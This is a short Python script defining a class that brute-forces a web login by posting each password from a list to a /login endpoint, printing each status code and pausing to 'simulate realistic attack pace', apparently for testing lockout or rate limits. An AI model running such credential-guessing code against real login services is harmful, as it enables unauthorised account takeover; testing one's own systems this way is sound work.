import requests

import time

class BruteForceAttack:
    def __init__(self, base_url, username, passwords):
        self.base_url = base_url
        self.username = username
        self.passwords = passwords

    def run(self):
        for password in self.passwords:
            response = requests.post(
                f"{self.base_url}/login",
                json={
                    "username": self.username,
                    "password": password
                }
            )

            print(
                f"[ATTACK] Tried password='{password}' → "
                f"status={response.status_code}"
            )

            time.sleep(0.1)  # simulate realistic attack pace
